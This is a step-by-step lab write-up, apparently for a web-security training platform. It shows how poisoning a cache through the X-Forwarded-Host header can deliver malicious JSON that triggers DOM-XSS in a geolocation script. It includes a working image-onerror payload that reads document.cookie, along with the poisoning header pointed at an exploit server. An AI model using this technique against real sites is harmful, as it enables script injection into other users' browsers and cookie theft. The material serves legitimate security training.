# Lab 05 — Web Cache Poisoning to Exploit a DOM Vulnerability

## Objective

Use cache poisoning to deliver malicious JSON that triggers DOM-XSS.

## Step 1 — Identify the input

1. Load the home page.
2. Use Param Miner to identify:

```http
X-Forwarded-Host
```

3. Confirm that it controls the `data.host` value passed into `initGeoLocate()`.

## Step 2 — Inspect the DOM sink

Study:

```text
/resources/js/geolocate.js
```

The source identifies unsafe handling of JSON data in `initGeoLocate()`.

## Step 3 — Prepare malicious JSON

On the exploit server use:

```text
/resources/json/geolocate.json
```

Add:

```http
Access-Control-Allow-Origin: *
```

Body:

```json
{
  "country": "<img src=1 onerror=alert(document.cookie) />"
}
```

Store the exploit.

## Step 4 — Poison

Use:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Replay until the exploit URL is reflected and `X-Cache: hit` appears.

## Important cacheability issue

The source notes that responses containing `Set-Cookie` are not cacheable in this lab.

If poisoning fails:

1. Reload the home page.
2. Obtain a request where the session cookie is already established.
3. Send that request to Repeater.
4. Repeat the poisoning process.

## Step 5 — Verify

Load the URL and confirm the alert. Continue re-poisoning until the lab visitor receives the response.

## Key Learning

Cache poisoning can manipulate a resource that is later processed by client-side JavaScript, turning a DOM vulnerability into a distributed attack.
